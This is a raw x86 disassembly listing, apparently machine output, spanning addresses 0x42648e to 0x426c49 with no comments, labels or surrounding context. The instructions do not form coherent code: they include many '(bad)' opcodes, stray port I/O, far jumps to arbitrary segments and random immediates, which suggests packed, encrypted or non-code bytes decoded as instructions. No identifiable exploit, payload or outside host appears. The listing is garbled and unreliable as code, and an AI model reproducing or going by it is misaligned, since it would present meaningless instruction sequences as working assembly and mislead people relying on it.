  42648e:	and    cl,BYTE PTR [edx+ebp*1-0x175f3fff]
  426495:	xor    ch,cl
  426497:	mov    al,BYTE PTR ds:0xb65da17
  42649d:	daa    
  42649e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42649f:	jmp    0x7942e748
  4264a4:	pop    ebx
  4264a5:	dec    eax
  4264a6:	lods   eax,DWORD PTR ds:[esi]
  4264a7:	cmp    BYTE PTR [eax+0x5e],bh
  4264aa:	pop    ebp
  4264ab:	xchg   esp,eax
  4264ac:	pop    ss
  4264ad:	test   al,0x59
  4264af:	test   BYTE PTR [edi+ecx*2+0x3c13209c],cl
  4264b6:	cs or  dh,BYTE PTR gs:[edx]
  4264ba:	cwde   
  4264bb:	sahf   
  4264bc:	test   eax,0x23d38577
  4264c1:	data16 or al,dh
  4264c4:	sbb    BYTE PTR [eax],0x8a
  4264c7:	test   eax,0x4c6c9f55
  4264cc:	push   bp
  4264ce:	stc    
  4264cf:	mov    ecx,esi
  4264d1:	loope  0x4264ce
  4264d3:	loop   0x426524
  4264d5:	imul   eax,DWORD PTR [ecx+edx*8+0x52f42206],0x51
  4264dd:	jbe    0x4264ee
  4264df:	das    
  4264e0:	pop    ds
  4264e1:	push   eax
  4264e2:	dec    ecx
  4264e3:	stos   BYTE PTR es:[edi],al
  4264e4:	fs je  0x42647b
  4264e7:	lock add BYTE PTR [eax],al
  4264ea:	dec    ecx
  4264eb:	push   ebp
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	cmc    
  4264f7:	jmp    0x426562
  4264f9:	mov    bh,0xbc
  4264fb:	repnz add DWORD PTR [eax],eax
  4264fe:	xchg   BYTE PTR [esi],al
  426500:	add    BYTE PTR [eax],al
  426502:	out    0x30,eax
  426504:	vaddsubpd xmm4,xmm6,XMMWORD PTR [ebx]
  426508:	pcmpeqb mm0,QWORD PTR [eax-0x68a0c92b]
  42650f:	fldcw  WORD PTR [edx+ebp*1+0x5d6c210a]
  426516:	into   
  426517:	cmc    
  426518:	jg     0x4264e1
  42651a:	adc    al,0xbb
  42651c:	mov    edx,0x68d5288a
  426521:	or     cl,0x36
  426524:	imul   esi,ecx,0x69
  426527:	icebp  
  426528:	not    DWORD PTR ds:0x48ff39f5
  42652e:	mov    ah,0x91
  426530:	mov    eax,ds:0xa36e6ec6
  426535:	fisubr WORD PTR [edi+0xc]
  426538:	and    BYTE PTR [eax+0x25],bl
  42653b:	cs jo  0x426593
  42653e:	sbb    al,0x3c
  426540:	sub    bl,BYTE PTR [ebx-0x44]
  426543:	xchg   ebp,eax
  426544:	jle    0x426524
  426546:	outs   dx,DWORD PTR ds:[esi]
  426547:	xor    ecx,edx
  426549:	cmp    eax,0x21ccabe4
  42654e:	mov    cs,WORD PTR [ebp+0x878881a]
  426554:	and    bl,BYTE PTR ss:[ecx]
  426557:	add    ebx,DWORD PTR [edi]
  426559:	outs   dx,DWORD PTR ds:[esi]
  42655a:	pop    ds
  42655b:	sbb    BYTE PTR [eax],al
  42655d:	jmp    0xdbb6e9bc
  426562:	inc    ebp
  426563:	mov    al,ds:0xcaa805d6
  426568:	lods   eax,DWORD PTR ds:[esi]
  426569:	ja     0x426565
  42656b:	mov    eax,ds:0x4dd4d65
  426570:	lds    ecx,FWORD PTR [esi-0x7d12782c]
  426576:	and    esp,esp
  426578:	into   
  426579:	jb     0x42653d
  42657b:	mov    dl,0xfd
  42657d:	out    0xf8,eax
  42657f:	xor    BYTE PTR [ecx-0xf],dl
  426582:	inc    ecx
  426583:	pop    eax
  426584:	ss js  0x4265bc
  426587:	retf   0xa358
  42658a:	aas    
  42658b:	inc    esi
  42658c:	sub    DWORD PTR [edi+0x67],esi
  42658f:	loope  0x4265e3
  426591:	mov    ds:0xbb87925b,al
  426596:	sub    al,0xb5
  426598:	mov    eax,0xd95c9a55
  42659d:	inc    esp
  42659e:	sub    al,0x49
  4265a0:	popf   
  4265a1:	xchg   ecx,eax
  4265a2:	stos   DWORD PTR es:[edi],eax
  4265a3:	sbb    BYTE PTR [edx],bl
  4265a5:	cmp    DWORD PTR [eax+0x31b89d38],esi
  4265ab:	clc    
  4265ac:	xchg   ecx,eax
  4265ad:	rcr    BYTE PTR ds:[edx],0x44
  4265b1:	int    0x5d
  4265b3:	inc    edx
  4265b4:	test   dl,0xbf
  4265b7:	enter  0x273d,0x33
  4265bb:	jbe    0x426627
  4265bd:	fild   QWORD PTR [ebp-0x6b]
  4265c0:	and    al,0xb8
  4265c2:	add    al,BYTE PTR [eax]
  4265c4:	loopne 0x42662e
  4265c6:	jbe    0x42659a
  4265c8:	mov    ds:0x30e03f4,al
  4265cd:	or     BYTE PTR [ecx],cl
  4265cf:	xchg   dx,ax
  4265d1:	rol    dh,cl
  4265d3:	mov    ebx,0xf5929450
  4265d8:	xchg   edx,eax
  4265d9:	pop    es
  4265da:	pop    ebp
  4265db:	lods   eax,DWORD PTR ds:[esi]
  4265dc:	mov    dl,0x81
  4265de:	xchg   edx,eax
  4265df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265e0:	inc    ebp
  4265e1:	fucomip st,st(3)
  4265e3:	leave  
  4265e4:	push   es
  4265e5:	fimul  WORD PTR [ebp+0x53]
  4265e8:	mov    esp,0x180eec23
  4265ed:	in     eax,dx
  4265ee:	cmc    
  4265ef:	inc    edi
  4265f0:	push   es
  4265f1:	rcr    DWORD PTR [edi],0x7e
  4265f4:	cli    
  4265f5:	mov    cl,0x47
  4265f7:	sbb    DWORD PTR [eax],esp
  4265f9:	je     0x4265b5
  4265fb:	jl     0x4265b4
  4265fd:	in     eax,dx
  4265fe:	push   ecx
  4265ff:	sub    eax,0xa7a8ac90
  426604:	dec    esi
  426605:	inc    ebp
  426606:	mov    ah,0xea
  426608:	pop    ss
  426609:	icebp  
  42660a:	xchg   esi,eax
  42660b:	sbb    esp,DWORD PTR [edi+ebx*8]
  42660e:	in     al,dx
  42660f:	mov    ebp,0x8ba41217
  426614:	jg     0x426694
  426616:	pop    edx
  426617:	mov    ds:0xb5121813,al
  42661c:	xchg   ecx,eax
  42661d:	loopne 0x426668
  42661f:	lahf   
  426620:	adc    eax,0xd2660803
  426625:	aaa    
  426626:	add    DWORD PTR [ebx-0x30],ebp
  426629:	(bad)  
  42662a:	push   gs
  42662c:	ja     0x42667e
  42662e:	jecxz  0x4266a8
  426630:	sti    
  426631:	pop    ecx
  426632:	jp     0x4265db
  426634:	adc    eax,0x2f905c2d
  426639:	scas   eax,DWORD PTR es:[edi]
  42663a:	adc    eax,DWORD PTR [edi+eax*1+0x35]
  42663e:	pop    es
  42663f:	ins    DWORD PTR es:[edi],dx
  426640:	add    cl,BYTE PTR [edx-0x3c]
  426643:	push   edi
  426644:	jle    0x426634
  426646:	xchg   edx,eax
  426647:	jmp    0x9de1:0x1ca540d9
  42664e:	icebp  
  42664f:	or     DWORD PTR [eax],ecx
  426651:	xchg   ecx,eax
  426652:	mov    al,ds:0x9a254d8
  426657:	fidiv  DWORD PTR [edi]
  426659:	les    edx,FWORD PTR [eax]
  42665b:	or     BYTE PTR [edi-0x4235e42d],cl
  426661:	in     eax,0x40
  426663:	ins    DWORD PTR es:[edi],dx
  426664:	push   ss
  426665:	inc    ebx
  426666:	das    
  426667:	mov    esp,DWORD PTR [esi-0x5763c0e0]
  42666d:	mov    al,0xb
  42666f:	ror    DWORD PTR [edi],0xd8
  426672:	arpl   WORD PTR [eax-0x118c87c5],bx
  426678:	cmovns eax,DWORD PTR [edx]
  42667b:	dec    edx
  42667c:	outs   dx,DWORD PTR ds:[esi]
  42667d:	mov    ah,0xbf
  42667f:	inc    esp
  426680:	rcl    BYTE PTR cs:[ecx+eax*2+0x2410fab9],1
  426688:	fisub  WORD PTR [edx+0x6ae0acc1]
  42668f:	add    al,0x7b
  426691:	sub    eax,0xa8416210
  426696:	inc    eax
  426697:	cmc    
  426698:	mov    cl,0x21
  42669a:	adc    al,0x1d
  42669c:	mov    ds:0x8906e637,eax
  4266a1:	push   0xd043ee30
  4266a6:	mov    ds:0x378c1852,al
  4266ab:	mov    ds:0x9c4ee3ff,al
  4266b0:	cmp    edx,DWORD PTR [edx+ecx*4-0x1e]
  4266b4:	pop    ss
  4266b5:	icebp  
  4266b6:	fsubr  QWORD PTR [ecx+0x69ef977c]
  4266bc:	sub    edx,DWORD PTR [ecx-0x1d]
  4266bf:	jno    0x426662
  4266c1:	xchg   ebx,eax
  4266c3:	fnsave [ebx-0x4a]
  4266c6:	jnp    0x426741
  4266c8:	lods   eax,DWORD PTR ds:[esi]
  4266c9:	loop   0x426698
  4266cb:	call   0x6031:0x9c75e69e
  4266d2:	mov    dh,0xc8
  4266d4:	jp     0x42665a
  4266d6:	adc    ebx,ecx
  4266d8:	(bad)  
  4266d9:	leave  
  4266da:	mov    eax,ds:0x37c12fe0
  4266df:	test   al,0xa3
  4266e1:	ss inc eax
  4266e3:	and    DWORD PTR [esi+0x3ea8dc31],edi
  4266e9:	popf   
  4266ea:	inc    edx
  4266eb:	out    dx,eax
  4266ec:	jmp    0x42667f
  4266ee:	mov    eax,0xedc32ae
  4266f4:	in     al,0x72
  4266f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266f7:	push   eax
  4266f8:	test   cl,cl
  4266fa:	scas   al,BYTE PTR es:[edi]
  4266fb:	xchg   edx,eax
  4266fc:	mov    dl,BYTE PTR [esi+0x3ff94790]
  426702:	push   cs
  426703:	retf   
  426704:	test   al,0x63
  426706:	mov    esp,?
  426708:	loop   0x42673d
  42670a:	push   eax
  42670b:	ret    
  42670c:	inc    eax
  42670d:	addr16 dec esp
  42670f:	and    ch,BYTE PTR [eax+0x32]
  426712:	ret    
  426713:	or     al,0xbc
  426715:	jmp    0x56ff657f
  42671a:	xchg   edi,eax
  42671b:	in     eax,0xa
  42671d:	pop    ss
  42671e:	leave  
  42671f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426720:	aad    0x4e
  426722:	xor    edx,DWORD PTR [ebp+0x43e72a01]
  426728:	mov    esi,0xca27a568
  42672d:	adc    al,0x47
  42672f:	sbb    al,BYTE PTR [eax]
  426731:	aaa    
  426732:	sar    edx,1
  426734:	push   0xffffffac
  426736:	gs sub edx,eax
  426739:	scas   al,BYTE PTR es:[edi]
  42673a:	or     BYTE PTR [ecx-0x71],al
  42673d:	cmc    
  42673e:	mov    ecx,0x9569d5ef
  426743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426744:	sbb    esp,DWORD PTR [edi]
  426746:	in     eax,0x5a
  426748:	mov    cl,0x94
  42674a:	mov    ds:0xb3d26ebd,al
  42674f:	push   esp
  426750:	jl     0x426791
  426752:	add    DWORD PTR [esp+eax*8-0x57],edi
  426756:	psubsw mm6,mm7
  426759:	dec    edi
  42675a:	push   es
  42675b:	mov    bl,BYTE PTR [eax-0x22]
  42675e:	xchg   ebx,eax
  42675f:	push   0x79
  426761:	or     esi,0x9dc2f77
  426767:	gs mov al,0x3d
  42676a:	lahf   
  42676b:	into   
  42676c:	add    eax,eax
  42676e:	mov    ds:0x8a47a0cc,al
  426773:	cld    
  426774:	sbb    eax,0x7608e1af
  426779:	inc    ecx
  42677a:	in     al,0x8e
  42677c:	lock and eax,0x1c18f1f4
  426782:	jmp    FWORD PTR [esi+0x18]
  426785:	mov    dl,0xbf
  426787:	mov    dh,0xd0
  426789:	inc    esi
  42678a:	sub    eax,0xbb16a440
  42678f:	inc    esi
  426790:	adc    BYTE PTR [esi-0x64],dl
  426793:	ds sbb al,0x4f
  426796:	mov    ch,0xd7
  426798:	mov    DWORD PTR [esi-0x56],esp
  42679b:	mov    ecx,0x7c89bc78
  4267a0:	push   ss
  4267a1:	std    
  4267a2:	cwde   
  4267a3:	inc    ebp
  4267a4:	ficomp DWORD PTR [ebp+0x44]
  4267a7:	xchg   esp,eax
  4267a8:	arpl   WORD PTR [eax],dx
  4267aa:	jb     0x426815
  4267ac:	sbb    eax,0xd5d17be7
  4267b1:	push   ss
  4267b2:	dec    esp
  4267b3:	and    ch,BYTE PTR [ecx]
  4267b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267b6:	adc    al,0xbd
  4267b8:	sbb    al,0x8a
  4267ba:	aad    0x4d
  4267bc:	aad    0xb0
  4267be:	and    eax,ecx
  4267c0:	lock shl DWORD PTR [esi-0x48],1
  4267c4:	retf   0x4f24
  4267c7:	mov    cl,BYTE PTR [ecx+0x42]
  4267ca:	or     eax,0xc1a6f28f
  4267cf:	pop    edx
  4267d0:	pop    ds
  4267d1:	add    al,0x4e
  4267d3:	push   esp
  4267d4:	dec    edi
  4267d5:	rol    DWORD PTR [ecx],0xa8
  4267d8:	neg    DWORD PTR [edi+0x1d28bb0c]
  4267de:	jnp    0x42679a
  4267e0:	js     0x4267d5
  4267e2:	ds xchg edi,eax
  4267e4:	aam    0xa5
  4267e6:	bound  ebp,QWORD PTR [esi-0x50]
  4267e9:	ja     0x42678b
  4267eb:	std    
  4267ec:	fimul  WORD PTR [edx]
  4267ee:	outs   dx,DWORD PTR ds:[esi]
  4267ef:	mov    dh,0x38
  4267f1:	mov    esp,0x83b8bf6d
  4267f6:	jo     0x426788
  4267f8:	arpl   WORD PTR [ebx-0x66],dx
  4267fb:	(bad)  
  4267fc:	pop    ecx
  4267fd:	std    
  4267fe:	test   eax,0xf8ad23b1
  426803:	dec    ebx
  426804:	daa    
  426805:	(bad)  
  426806:	xor    bl,ch
  426808:	cmp    BYTE PTR ds:0xd8847d8b,ch
  42680e:	jle    0x4267d2
  426810:	dec    esi
  426811:	mov    ds:0x84288ff1,eax
  426816:	lods   al,BYTE PTR ds:[esi]
  426817:	fdivp  st(2),st
  426819:	mov    BYTE PTR [ecx+0x3d7e3670],dh
  42681f:	add    al,0xd
  426821:	and    bh,BYTE PTR [eax+0x58]
  426824:	das    
  426825:	xchg   ebp,esp
  426827:	mov    edx,0x215957e
  42682c:	nop
  42682d:	add    eax,0xf0e8d07d
  426832:	push   ds
  426833:	mov    al,0x4
  426835:	xchg   DWORD PTR [eax-0x1bdcc32c],esp
  42683b:	icebp  
  42683c:	push   0xffffffdf
  42683e:	xchg   BYTE PTR [edi-0x73],dl
  426841:	sub    al,0xd7
  426843:	test   DWORD PTR [ecx-0x567ad51e],ecx
  426849:	pop    ecx
  42684a:	popf   
  42684b:	(bad)  
  42684c:	or     eax,0x4a504db5
  426851:	inc    edx
  426852:	in     eax,0x45
  426854:	stos   BYTE PTR es:[edi],al
  426855:	pushf  
  426856:	cmp    DWORD PTR [edx-0x45805fd7],ecx
  42685c:	adc    eax,0xbe9fc5d
  426861:	add    eax,0xf56f7f1a
  426866:	scas   eax,DWORD PTR es:[edi]
  426867:	add    ebp,DWORD PTR [ebp+0x50]
  42686a:	leave  
  42686b:	test   al,0x1d
  42686d:	mov    eax,DWORD PTR [ebx]
  42686f:	mov    ds:0x18c414ab,al
  426874:	(bad)  [ebp-0x160fb290]
  42687a:	mov    bh,ah
  42687c:	xchg   edi,eax
  42687d:	dec    eax
  42687e:	adc    al,BYTE PTR [ebp+0x48]
  426881:	cs sub eax,0x7146506f
  426887:	dec    edi
  426888:	jmp    0xc4f3:0xe70baba3
  42688f:	mul    BYTE PTR [edi+eax*2]
  426892:	or     dh,bl
  426894:	sahf   
  426895:	dec    eax
  426896:	fist   WORD PTR [eax-0x29]
  426899:	out    0x39,eax
  42689b:	(bad)  
  42689c:	shl    BYTE PTR [ebx+0x53],1
  42689f:	dec    ebp
  4268a0:	pop    ds
  4268a1:	dec    ebx
  4268a2:	inc    edx
  4268a3:	popa   
  4268a4:	push   ebx
  4268a5:	add    al,0xf1
  4268a7:	int3   
  4268a8:	ds dec edi
  4268aa:	iret   
  4268ab:	sub    eax,0xe264d43
  4268b0:	mov    eax,ds:0x2229bb31
  4268b5:	push   edi
  4268b6:	in     eax,dx
  4268b7:	jmp    0x42688f
  4268b9:	cmc    
  4268ba:	inc    esi
  4268bb:	(bad)  
  4268bc:	dec    edi
  4268bd:	scas   eax,DWORD PTR es:[di]
  4268bf:	stos   BYTE PTR es:[edi],al
  4268c0:	inc    ecx
  4268c1:	xchg   esp,eax
  4268c2:	ret    0x7105
  4268c5:	js     0x4268cc
  4268c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268c8:	push   ebx
  4268c9:	jmp    0x6a1028c9
  4268ce:	adc    BYTE PTR [ebx-0x1a],dh
  4268d1:	pop    ebx
  4268d2:	arpl   WORD PTR [ebx+0x2],di
  4268d5:	out    0xf1,al
  4268d7:	cmp    DWORD PTR [edx+0x52a89750],esi
  4268dd:	dec    ebp
  4268de:	pop    esi
  4268df:	mov    edx,0xd9fad7af
  4268e4:	sbb    al,ah
  4268e6:	add    ch,cl
  4268e8:	cld    
  4268e9:	js     0x426882
  4268eb:	jg     0x4268f6
  4268ed:	ret    0x880b
  4268f0:	cmp    dl,BYTE PTR [ebx+0x7b]
  4268f3:	out    dx,al
  4268f4:	mov    ch,0xb
  4268f6:	test   eax,0x3e486060
  4268fb:	sub    esp,DWORD PTR [edi+edi*8]
  4268fe:	inc    ecx
  4268ff:	inc    esi
  426900:	cdq    
  426901:	pop    edi
  426902:	loopne 0x426969
  426904:	xor    ecx,DWORD PTR [edx-0x791b0118]
  42690a:	jb     0x426978
  42690c:	pop    eax
  42690d:	pop    edx
  42690e:	lods   al,BYTE PTR ds:[esi]
  42690f:	shl    esi,1
  426911:	dec    ebx
  426912:	loope  0x42695e
  426914:	jno    0x426960
  426916:	aaa    
  426917:	sub    BYTE PTR [eax+0x36694751],ah
  42691d:	jecxz  0x42691d
  42691f:	and    DWORD PTR [edx+0x7b568768],ebx
  426925:	(bad)  
  426926:	jl     0x4268e4
  426928:	int    0x64
  42692a:	mov    dh,0x59
  42692c:	cmp    dh,BYTE PTR [esi-0xcfeec35]
  426932:	sub    DWORD PTR [ebx+0x8185b16],0x7c
  426939:	pop    ds
  42693a:	xchg   esi,eax
  42693b:	outs   dx,DWORD PTR ds:[esi]
  42693c:	repz pushf 
  42693e:	mov    edx,0xbc6be573
  426943:	mov    eax,ds:0x9cb9a40c
  426948:	inc    esi
  426949:	fdivr  DWORD PTR [edx-0x27b7191d]
  42694f:	jecxz  0x426911
  426951:	loop   0x4268e0
  426953:	adc    DWORD PTR [ebx],esi
  426955:	add    eax,0xfbf8768b
  42695a:	pop    edx
  42695b:	xor    cl,BYTE PTR [ecx]
  42695d:	hlt    
  42695e:	shr    BYTE PTR [edi-0x3a27197],cl
  426964:	pop    esi
  426965:	jns    0x4269c6
  426967:	add    cl,bh
  426969:	ja     0x426988
  42696b:	mov    eax,ds:0x83f9df08
  426970:	mov    dl,0x80
  426972:	and    BYTE PTR [ecx],bl
  426974:	test   eax,0xd3e42b2e
  426979:	sub    al,0xd0
  42697b:	adc    bl,BYTE PTR [eax]
  42697d:	shl    BYTE PTR [ebx-0x14],cl
  426980:	push   esp
  426981:	push   esp
  426982:	in     eax,0x75
  426984:	fsubr  QWORD PTR [ecx]
  426986:	scas   al,BYTE PTR es:[edi]
  426987:	cmp    al,0xe9
  42698a:	cwde   
  42698b:	(bad)  
  42698c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42698d:	ja     0x42695b
  42698f:	jp     0x4269eb
  426991:	sahf   
  426992:	push   ds
  426993:	xchg   edi,eax
  426994:	add    DWORD PTR [ecx],0x91ed8831
  42699a:	aas    
  42699b:	gs repz inc ebp
  42699e:	jae    0x426942
  4269a0:	jle    0x426922
  4269a2:	fs inc edi
  4269a4:	dec    ebp
  4269a5:	jg     0x426956
  4269a7:	outs   dx,BYTE PTR ds:[esi]
  4269a8:	mov    al,ds:0x17f66478
  4269ad:	mov    ebx,0xfabe0806
  4269b2:	fsubp  st(3),st
  4269b4:	fisubr WORD PTR [edx+0x5bfc012d]
  4269ba:	jns    0x426973
  4269bc:	sti    
  4269bd:	int    0x36
  4269bf:	lds    esp,FWORD PTR [ebx]
  4269c1:	test   BYTE PTR [edi],bl
  4269c3:	mov    dl,ah
  4269c5:	imul   esp,DWORD PTR [edi-0x619019bb],0xe
  4269cc:	xchg   ebp,eax
  4269cd:	mov    bh,0x4e
  4269cf:	dec    esp
  4269d0:	or     edi,DWORD PTR [ebp-0x80]
  4269d3:	jne    0x426a17
  4269d5:	jl     0x426a1e
  4269d7:	mov    BYTE PTR [ebx+0x1694f898],0x49
  4269de:	(bad)  
  4269df:	shl    ah,0x9c
  4269e2:	rcl    DWORD PTR [eax+ebp*8-0x7c1e615d],1
  4269e9:	fst    st(6)
  4269eb:	mov    esi,0x1db0d01f
  4269f0:	fs std 
  4269f2:	xchg   DWORD PTR [ecx-0x483304cf],esp
  4269f8:	jmp    0xc84ca771
  4269fd:	shl    DWORD PTR [ebx-0x604a067e],1
  426a03:	inc    ebp
  426a04:	hlt    
  426a05:	loop   0x4269af
  426a07:	and    BYTE PTR [edx+0x59fd9019],ah
  426a0d:	inc    esp
  426a0e:	jle    0x426a8e
  426a10:	xchg   esi,eax
  426a11:	jp     0x426a37
  426a13:	sahf   
  426a14:	enter  0x9ac1,0x48
  426a18:	jb     0x4269bf
  426a1a:	mov    edi,DWORD PTR [ebp+ebp*1+0x6e]
  426a1e:	into   
  426a1f:	popa   
  426a20:	sahf   
  426a21:	je     0x426aa2
  426a23:	loop   0x426a72
  426a25:	push   es
  426a26:	dec    edi
  426a27:	adc    dl,BYTE PTR [ebx]
  426a29:	mov    ds:0xd59a592f,eax
  426a2e:	mov    dl,BYTE PTR [ecx-0x7832ce6b]
  426a34:	mov    BYTE PTR [ebp-0x77],bh
  426a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a38:	xchg   edi,eax
  426a39:	outs   dx,DWORD PTR ds:[esi]
  426a3a:	out    0x3d,eax
  426a3c:	inc    eax
  426a3d:	int3   
  426a3e:	and    ch,dl
  426a40:	retf   0x25f
  426a43:	mov    DWORD PTR [edi+0x79],esi
  426a46:	inc    eax
  426a47:	fisubr WORD PTR [ebp+0x36b7e3cc]
  426a4d:	fs loope 0x426a0b
  426a50:	loop   0x426ac0
  426a52:	push   eax
  426a53:	mov    dl,BYTE PTR [eax+0x6b7f0424]
  426a59:	paddb  mm3,QWORD PTR [ecx]
  426a5c:	aad    0x36
  426a5e:	add    bh,BYTE PTR [edx]
  426a60:	shr    DWORD PTR ds:0xa6629ec8,1
  426a66:	cmp    BYTE PTR [eax-0x17],0x43
  426a6a:	mov    ecx,0xf53baafc
  426a6f:	fs das 
  426a71:	push   ss
  426a72:	jno    0x426ab4
  426a74:	pop    edi
  426a75:	add    al,bl
  426a77:	int3   
  426a78:	xchg   ecx,eax
  426a79:	int    0x96
  426a7b:	jns    0x426a17
  426a7d:	cld    
  426a7e:	int    0x81
  426a80:	pop    ecx
  426a81:	int    0x98
  426a83:	dec    esi
  426a84:	xchg   ecx,eax
  426a85:	daa    
  426a86:	push   esi
  426a87:	jle    0x426a6b
  426a89:	jmp    0x2bd6e296
  426a8e:	pop    ebx
  426a8f:	mov    ds:0xff94719c,al
  426a94:	sub    eax,0x8ae0b395
  426a99:	adc    edi,DWORD PTR [esi-0x572663d2]
  426a9f:	neg    BYTE PTR [ecx]
  426aa1:	mov    eax,0xf0e22f73
  426aa6:	fld    TBYTE PTR [edx+esi*2]
  426aa9:	fcmovu st,st(6)
  426aab:	mov    ebp,eax
  426aad:	pop    ecx
  426aae:	dec    edx
  426aaf:	adc    al,0xce
  426ab1:	sbb    BYTE PTR [ecx],al
  426ab3:	mov    ah,0xfe
  426ab5:	in     al,dx
  426ab6:	mov    al,ds:0x6e317c74
  426abb:	mov    ebp,0x789c99ba
  426ac0:	int3   
  426ac1:	cld    
  426ac2:	lea    ebx,[edi-0x3]
  426ac5:	adc    eax,0x4c5a225e
  426aca:	repz jmp 0x5a74a5ea
  426ad0:	sub    bl,BYTE PTR [ebx]
  426ad2:	out    0x32,al
  426ad4:	pop    esi
  426ad5:	jno    0x426ac5
  426ad7:	inc    esp
  426ad8:	pop    ecx
  426ad9:	shl    BYTE PTR [eax+0x7e363c42],1
  426adf:	lock ret 
  426ae1:	inc    ebx
  426ae2:	xor    al,0xa4
  426ae4:	mov    dl,0x26
  426ae6:	lahf   
  426ae7:	ficomp WORD PTR [edi+0x1f]
  426aea:	js     0x426a95
  426aec:	and    DWORD PTR [ebx],0xffffffab
  426aef:	mov    bh,BYTE PTR [edi]
  426af1:	push   0x4377bc92
  426af6:	int    0x74
  426af8:	and    DWORD PTR [eax],ecx
  426afa:	or     eax,0xeba1e68c
  426aff:	in     eax,dx
  426b00:	retf   
  426b01:	std    
  426b02:	push   0xffffffc3
  426b04:	popa   
  426b05:	out    0xeb,al
  426b07:	jmp    0x426b54
  426b09:	in     al,dx
  426b0a:	fiadd  WORD PTR [ebp+ebp*1+0x2eb7d460]
  426b11:	and    BYTE PTR [ecx],ch
  426b13:	inc    ecx
  426b14:	or     BYTE PTR [edi+edi*8-0x7422ee42],bh
  426b1b:	stos   DWORD PTR es:[edi],eax
  426b1c:	push   cs
  426b1d:	repz pop edi
  426b1f:	jnp    0x426acb
  426b21:	and    edi,DWORD PTR [ebp-0x3ef18cb8]
  426b27:	shl    ebp,cl
  426b29:	add    DWORD PTR [edx+0x79],esp
  426b2c:	imul   ecx,ebx,0xb7f79062
  426b32:	jns    0x426b80
  426b34:	or     ebx,DWORD PTR [esi]
  426b36:	push   edi
  426b37:	xor    eax,0x2906ef10
  426b3c:	inc    ecx
  426b3d:	jb     0x426acc
  426b3f:	out    0x2,eax
  426b41:	fisub  DWORD PTR [ebx]
  426b43:	pop    ecx
  426b44:	pop    eax
  426b45:	mov    ecx,0xd5007f7
  426b4a:	pusha  
  426b4b:	enter  0x776,0x2b
  426b4f:	dec    eax
  426b50:	add    dl,BYTE PTR [ebx]
  426b52:	ret    0x2e64
  426b55:	push   edi
  426b56:	mov    ebx,0xed698afc
  426b5b:	adc    BYTE PTR [ebp+ebx*2+0xdae7053],0x97
  426b63:	dec    ebp
  426b64:	popf   
  426b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b66:	in     al,dx
  426b67:	adc    eax,DWORD PTR [ecx+0x15604bb2]
  426b6d:	mov    edi,0x68540cbc
  426b72:	pop    edi
  426b73:	sub    BYTE PTR [esi],dl
  426b75:	mov    esp,0xdaaf968a
  426b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b7b:	scas   eax,DWORD PTR es:[edi]
  426b7c:	loope  0x426b1f
  426b7e:	js     0x426b3a
  426b80:	ins    BYTE PTR es:[edi],dx
  426b81:	rol    DWORD PTR [ebp+0x25fc8cc],0xa9
  426b88:	add    BYTE PTR [eax],al
  426b8a:	inc    edi
  426b8b:	push   esi
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0x8281,0x8d
  426b98:	leave  
  426b99:	rol    BYTE PTR [edx-0x7],1
  426b9c:	add    DWORD PTR [eax],eax
  426b9e:	jle    0x426ba6
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	or     cl,BYTE PTR [ecx-0x16]
  426ba5:	xchg   ecx,eax
  426ba6:	xor    al,0x99
  426ba8:	cmc    
  426ba9:	xor    eax,0xbf603c93
  426bae:	out    0x90,eax
  426bb0:	mov    ds:0x8ff30593,al
  426bb5:	push   edi
  426bb6:	push   es
  426bb7:	loop   0x426c14
  426bb9:	mov    ds:0x96da1be4,eax
  426bbe:	sbb    eax,0x4979beb8
  426bc3:	loope  0x426c3b
  426bc5:	call   0x31171fa9
  426bca:	sbb    BYTE PTR [eax],dl
  426bcc:	mov    edi,0x8e3311b1
  426bd1:	sub    eax,0xf4d176c
  426bd6:	sub    al,0xd5
  426bd8:	stos   DWORD PTR es:[edi],eax
  426bd9:	or     eax,0xe1a8c4b4
  426bde:	mov    dl,0x44
  426be0:	fist   DWORD PTR [edx-0x71]
  426be3:	xchg   edi,eax
  426be4:	and    ah,BYTE PTR [ecx-0x177f12b2]
  426bea:	shl    BYTE PTR [esi+0x26],1
  426bed:	cmp    al,BYTE PTR [edx+0x78487f32]
  426bf3:	(bad)  
  426bf4:	cmp    BYTE PTR [ebx-0x43],ah
  426bf7:	jb     0x426c0c
  426bf9:	xchg   ch,bh
  426bfb:	fsubr  DWORD PTR [eax-0x52]
  426bfe:	jp     0x426bf8
  426c00:	mov    BYTE PTR [ebx+0x7d18e8bb],ah
  426c06:	xchg   esi,eax
  426c07:	repnz sbb edx,0x21a42790
  426c0e:	lea    esp,[edx]
  426c10:	gs xor al,0x88
  426c13:	add    eax,0xb15c99e6
  426c18:	dec    BYTE PTR [esi]
  426c1a:	out    0x60,eax
  426c1c:	add    esi,edx
  426c1e:	mov    ds:0x26a2085c,al
  426c23:	and    al,cl
  426c25:	xor    eax,esi
  426c27:	es retf 
  426c29:	add    al,0x7e
  426c2b:	cld    
  426c2c:	mov    al,ds:0xef140296
  426c31:	leave  
  426c32:	out    dx,eax
  426c33:	out    dx,eax
  426c34:	cs stc 
  426c36:	push   esi
  426c37:	pop    ss
  426c38:	jle    0x426c6f
  426c3a:	jae    0x426c81
  426c3c:	imul   edx,DWORD PTR [edi],0x6c
  426c3f:	mov    al,ah
  426c41:	out    dx,al
  426c42:	dec    ebx
  426c43:	jg     0x426c18
  426c45:	retf   0x7cc4
  426c48:	pop    ds
  426c49:	xchg   ecx,eax
